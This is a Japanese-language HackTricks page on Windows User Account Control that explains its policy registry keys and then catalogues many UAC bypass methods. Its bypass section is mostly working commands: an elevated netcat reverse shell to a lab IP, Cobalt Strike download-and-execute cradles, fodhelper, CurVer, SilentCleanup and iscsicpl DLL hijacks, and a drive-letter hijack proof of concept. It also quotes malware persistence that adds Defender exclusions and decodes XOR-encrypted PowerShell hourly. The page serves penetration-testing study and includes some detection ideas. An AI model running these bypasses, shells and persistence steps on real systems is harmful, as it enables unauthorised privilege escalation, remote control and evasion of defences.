# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格されたアクティビティに対する同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを侵害する可能性のあるタスク**を実行できます。UAC が有効な場合、管理者が明示的に承認して、これらのアプリケーションやタスクがシステムへの管理者レベルのアクセス権を持って実行されるようにしない限り、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行**されます。これは、管理者を意図しない変更から保護する利便性のための機能ですが、セキュリティ境界とは見なされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つの token が与えられます。1 つは medium integrity で通常の操作を実行する標準ユーザー token、もう 1 つは admin 権限を持つ token です。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の仕組みについて詳しく説明しています。<sup>[[2]](#references)</sup> 管理者はセキュリティポリシーを使用して、組織固有の UAC の動作をローカルレベル（secpol.msc を使用）で構成したり、Active Directory ドメイン環境で Group Policy Objects (GPO) を介して構成および展開したりできます。各種設定については [こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) で詳しく説明されています。UAC には設定可能な Group Policy 設定が 10 個あります。以下の表に詳細を示します。

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 組み込み Administrator アカウントに対する Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Admin Approval Mode の管理者に対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop 上で Windows 以外のバイナリに対して同意を求める) |
| [User Account Control: 標準ユーザーに対する昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop 上で資格情報を求める)         |
| [User Account Control: アプリケーションのインストールを検出して昇格を求める](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効。Enterprise ではデフォルトで無効)           |
| [User Account Control: 署名および検証済みの実行ファイルのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: secure locations にインストールされた UIAccess アプリケーションのみを昇格する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: すべての管理者を Admin Approval Mode で実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: secure desktop を使用せずに UIAccess アプリケーションが昇格を求めることを許可する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: 昇格を求める際に secure desktop に切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: ファイルおよび Registry への書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows でソフトウェアをインストールするためのポリシー

**local security policies**（ほとんどのシステムでは `"secpol.msc"`）は、デフォルトで**非管理者ユーザーによるソフトウェアのインストールを防止する**ように構成されています。つまり、非管理者ユーザーがソフトウェアのインストーラーをダウンロードできたとしても、admin アカウントなしでは実行できません。

### UAC に昇格を求めさせるための Registry Keys

admin 権限を持たない標準ユーザーとして、特定の操作を実行しようとした際に「標準」アカウントが**UAC によって資格情報を求められる**ようにできます。この操作には特定の **Registry Keys** の変更が必要であり、そのためには admin 権限が必要です。ただし、**UAC bypass** が存在する場合、または攻撃者がすでに admin としてログインしている場合はこの限りではありません。

ユーザーが **Administrators** グループに所属している場合でも、これらの変更により、管理操作を実行するためにユーザーは**アカウント資格情報を再入力する必要があります**。

**実際には、すでに elevated token、UAC bypass、またはこれらのキーを変更できる misconfiguration を取得している場合にのみ有用です。それ以外の場合、Registry への書き込み自体がブロックされます。**

変更する必要がある Registry Keys とエントリは以下のとおりです（括弧内はデフォルト値）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy ツールから手動で行うこともできます。変更後、管理操作を実行すると、ユーザーに資格情報の再入力が求められます。

### 注記

**User Account Control はセキュリティ境界ではありません。** したがって、standard users は local privilege escalation exploit なしにアカウントから抜け出して admin 権限を取得することはできません。

### ユーザーに「コンピューターへの完全なアクセス」を要求する
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は integrity checks を使用し、high-integrity-level のプロセス（web browsers など）が low-integrity-level のデータ（temporary Internet files folder など）にアクセスするのを防ぎます。これは、browser を low-integrity token で実行することで実現されます。browser が low-integrity zone に保存されたデータへアクセスしようとすると、operating system はプロセスの integrity level を確認し、それに応じてアクセスを許可します。この機能は、remote code execution attacks がシステム上の機密データへアクセスするのを防ぐのに役立ちます。
- user が Windows に log on すると、システムは user の privileges の一覧を含む access token を作成します。Privileges は、user の rights と capabilities の組み合わせとして定義されます。token には user の credentials の一覧も含まれます。これらの credentials は、computer および network 上の resources に対して user を authenticate するために使用されます。

### Autoadminlogon

Windows が startup 時に特定の user へ自動的に log on するよう設定するには、**`AutoAdminLogon` registry key** を設定します。これは kiosk environments や testing purposes に便利です。registry に password が露出するため、安全なシステムでのみ使用してください。

Registry Editor または `reg add` を使用して、以下の keys を設定します：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常の logon 動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim への graphical access がある場合、UAC prompt が表示されたときに "Yes" をクリックするだけでよいため、UAC bypass は簡単です

UAC bypass は、次の状況で必要になります：**UAC が有効で、process が medium integrity context で実行されており、user が administrators group に所属している場合**。

UAC が最高の security level（Always）に設定されている場合は、他の level（Default）のいずれかに設定されている場合よりも、**UAC bypass がはるかに困難**であることに注意してください。

### medium-integrity shell からの Fast triage

bypass を試す前に、適切な状況にあることを確認し、host build を既知の動作する methods に対応付けます：
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実践メモ:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token で、直接 high integrity を要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses で一般的なシナリオです。
- `Always Notify` はハードルを上げますが、失敗すると決めつけず、対象の正確な build をテストすべきです。UACME は、最新の Windows build でも一部の `AlwaysNotify compatible` methods を追跡しています。<sup>[[3]](#references)</sup>

### UAC 無効

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）になっている場合、次のような方法で **admin privileges** を持つ reverse shell（high integrity level）を実行できます。
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass"（ファイルシステムへの完全なアクセス）

Administrators group に属するユーザーの shell を使用できる場合、SMB（ファイルシステム）経由で共有されている **C$** を新しいディスクにローカルで mount でき、**ファイルシステム内のすべてにアクセス**できます（Administrator のホームフォルダーも含む）。

> [!WARNING]
> **この trick はもう機能しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strikeを使用したUAC bypass

Cobalt Strikeのtechniqueは、UACが最大セキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールもいくつかあります。

### 昇格された COM インターフェース（`ICMLuaUtil` / `CMSTPLUA`）

Auto-elevated COM オブジェクトは、最新の build でも依然として実用的な UAC attack surface です。`ICMLuaUtil` は、現在の Windows ブランチでも動作するとして UACME に引き続き追跡されており、offensive tooling は、COM Elevation Moniker を呼び出す前に、interactive desktop process、64-bit execution、場合によっては PEB/process masquerading を組み合わせることで `CMSTPLUA` に適応し続けています。<sup>[[3]](#references)</sup>

実用的なヒント:
- ユーザーの **interactive session** にある **64-bit** process（一般的には `explorer.exe` またはその child）を優先します。
- raw shell が失敗した場合は、単純な `CreateProcess` wrapper ではなく、BOF / UACME implementation から再試行します。
- child execution は**別の elevated process** で実行されることを想定してください。多くの BOF は現在の beacon を in-place で elevate しません。

### KRBUACBypass

Documentation と tool は [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) は、UAC bypass techniques の collection です。Visual Studio または MSBuild で compile してください。build によって複数の executable（例: `Source\Akagi\output\x64\Debug\Akagi.exe`）が作成されるため、target build に適した method を選択します。<sup>[[3]](#references)</sup>\
注意してください。一部の bypass は、ユーザーに警告を与える可能性のある visible programs や prompts を起動します。<sup>[[3]](#references)</sup>

UACME には、各 technique が動作し始めた **build version** が記載されています。<sup>[[3]](#references)</sup> 自分の versions に影響する technique を検索できます。
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[この](https://en.wikipedia.org/wiki/Windows_10_version_history)ページを使用すると、ビルドバージョンから Windows のリリース `1607` を特定できます。

実践的なワークフローでは、まず**ホストのビルドをスコアリング**し、その後で対応する手法を実行します。
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` はローカルの build を既知の UAC methods と迅速に比較できるため、動作しない PoC を素早く除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME` は、bypass を正確な build に対応付けるための、現在も最良の公開 catalogue です。最近のリリースでは新しい methods が追加され、既存の methods も **Windows 11 25H2** に対して再テストされています。そのため、古い blog post が変更なしで適用できると判断する前に、README/release notes を再確認してください。<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼された binary である `fodhelper.exe` は、最新の Windows では auto-elevated されます。起動時に、`DelegateExecute` verb を検証せずに以下の per-user registry path を照会します。そこに command を配置すると、Medium Integrity の process（user が Administrators のメンバー）が、UAC prompt なしで High Integrity の process を起動できます。

fodhelper が照会する Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps (set your payload, then trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意:
- 現在のユーザーが Administrators のメンバーで、UAC level が default/lenient の場合に機能します（Always Notify で追加の制限がある場合を除く）。
- 64-bit Windows 上で 32-bit process から 64-bit PowerShell を起動するには、`sysnative` path を使用します。
- Payload には任意の command（PowerShell、cmd、または EXE path）を指定できます。stealth のため、prompting UIs は避けてください。

#### CurVer/extension hijack variant（HKCU only）

最近の `fodhelper.exe` を悪用するサンプルでは、`DelegateExecute` を回避し、代わりに per-user の `CurVer` value を介して **`ms-settings` ProgID を redirect** します。auto-elevated binary は引き続き `HKCU` 配下の handler を resolve するため、keys を配置するのに admin token は必要ありません:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
権限昇格後、malwareは通常、`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`を`0`に設定して**今後のプロンプトを無効化**し、その後さらにdefense evasion（例：`Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、high integrityで実行されるようpersistenceを再作成します。典型的なpersistence taskでは、**XOR-encrypted PowerShell script**をディスクに保存し、1時間ごとにメモリ内でdecode/executeします。<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この variant でも dropper をクリーンアップし、staged payloads だけを残すため、検出には **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の tampering、Defender exclusion の作成、またはメモリ内で PowerShell を復号する scheduled tasks の監視が必要になります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task（`HKCU\Environment\windir`）による UAC bypass

`SilentCleanup` は `cleanmgr.exe` を最高権限で起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、その展開先を任意のコマンドにリダイレクトし、consent dialog なしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME がこの technique を有効な状態に保っており、最近の issue tracking でも Windows 11 24H2 では quoting の小さな調整だけが必要になる可能性が示されているため、最近の builds でもこの手法は引き続きテストする価値があります。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
その build でパスが引用符付きになる場合は、payload の末尾に引用符を付けて再試行してください（例: `cmd.exe"`）。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### 追加の UAC bypass

UI フロー、COM オブジェクト、またはデスクトップ操作を悪用する従来の UAC bypass の多くは、被害者の**完全なインタラクティブセッション**を必要とします。一般的な `nc.exe` shell や **Session 0** で実行されている service では不十分なことがよくあります。

これは **meterpreter** session を使うことで解決できる場合があります。**Session** の値が **1** と等しい **process** に migrate してください。

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### GUI を使った UAC Bypass

**GUI にアクセスできる場合は、UAC prompt が表示されたときにそのまま承認できます**。実際には技術的な bypass は必要ありません。そのため、GUI session を取得するだけで、UAC による実際上の障害を回避できることがよくあります。

さらに、誰かが使用していた GUI session（RDP 経由の可能性があります）を取得した場合、**administrator として実行されているツールが存在することがあります**。そこから、例えば [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のように、UAC による再度の prompt なしで、**cmd** を直接 **admin として実行**できます。こちらのほうが少し**stealthy**な可能性があります。

### ノイジーな brute-force UAC bypass

ノイズが許容される場合は、[**ForceAdmin**](https://github.com/Chainski/ForceAdmin) のような tool を使い、ユーザーが承認するまで elevation を繰り返し要求できます。

### 独自の bypass - Basic UAC bypass methodology

**UACME** を確認すると、**多くの UAC bypass が DLL hijacking を悪用している**ことに気付くでしょう（多くの場合、elevated binary に writable path から attacker-controlled DLL を load させます）。[DLL hijacking vulnerability の見つけ方については、こちらを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate** する binary を見つけます（実行時に high integrity level で動作することを確認します）。
2. procmon を使い、**DLL Hijacking** に対して脆弱な可能性がある "**NAME NOT FOUND**" event を見つけます。
3. おそらく、書き込み権限のない **protected path**（C:\Windows\System32 など）に DLL を**書き込む**必要があります。これには以下を使って bypass できます。
1. **wusa.exe**: Windows 7、8、8.1。protected path 内に CAB file の内容を extract できます（この tool は high integrity level で実行されるためです）。
2. **IFileOperation**: Windows 10。
4. DLL を protected path 内に copy し、脆弱な autoelevated binary を実行する **script** を準備します。

### 別の UAC bypass technique

**autoElevated binary** が、**実行**される **binary** または **command** の **name/path** を **registry** から **read** しようとしているかを監視します（binary がこの情報を **HKCU** 内から検索する場合は、より興味深いものになります）。

### `SysWOW64\iscsicpl.exe` と user `PATH` DLL hijack による UAC bypass

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は、search order によって `iscsiexe.dll` を load させるために悪用できる **auto-elevated** binary です。**user-writable** folder 内に malicious な `iscsiexe.dll` を配置し、その folder が検索されるように current user の `PATH`（例えば `HKCU\Environment\Path` 経由）を変更できれば、Windows は **UAC prompt を表示せずに** attacker DLL を elevated `iscsicpl.exe` process 内へ load する可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実用上の注意:
- これは、current user が **Administrators** に所属しているものの、UAC によって **Medium Integrity** で実行されている場合に有用です。
- この bypass で関係するのは **SysWOW64** 側の copy です。**System32** 側の copy は別の binary として扱い、挙動を個別に検証してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせです。そのため、他の UAC bypass で使用するものと同じ ProcMon workflow が、missing DLL load の検証に役立ちます。

最小限の flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
検出のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に、`C:\Windows\SysWOW64\iscsicpl.exe` が実行されていないかをアラートする。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` など、**user-controlled** な場所にある `iscsiexe.dll` を検索する。
- `iscsicpl.exe` の起動と、想定外の子プロセスや通常の Windows ディレクトリ外からの DLL load を関連付ける。

### 個別に確認すべき新しい research

2024 年以降の一部の chain は、従来の `HKCU\Software\Classes` registry hijack とは異なる形になっています。たとえば、activation-context cache poisoning では、**drive remap** と **DLL redirection** を chain して、`ctfmon.exe` や、後続のターゲットである `fodhelper.exe` など、信頼された UI / auto-elevated binary を通じて medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、次のページにある簡潔な payload の例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) の per-logon-session DOS device map を介した drive-letter hijack

Windows 11 25H2 における `RAiLaunchAdminProcess` / UIAccess の attack surface 全体については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の「Administrator Protection」は、per-session `\Sessions\0\DosDevices/<LUID>` map を持つ shadow-admin token を使用します。この directory は、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって lazy に作成されます。攻撃者が shadow-admin token を **SecurityIdentification** でのみ impersonate すると、directory は攻撃者を **owner** として作成されます（`CREATOR OWNER` を継承）。これにより、`\GLOBAL??` より優先される drive-letter link が可能になります。<sup>[[7]](#references)</sup>

**手順:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に Duplicate し、`\??` を open する間 impersonate して、`\Sessions\0\DosDevices/<LUID>` を攻撃者の ownership で作成させる。
3. そこに攻撃者が control する storage を指す `C:` symlink を作成する。その session で以降に行われる filesystem access では、`C:` が攻撃者の path に resolve され、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques のコレクション](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI、AI を導入して PowerShell Backdoors を生成](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 東南アジア政府のターゲットに対する 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の Bypassing](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した UAC Bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
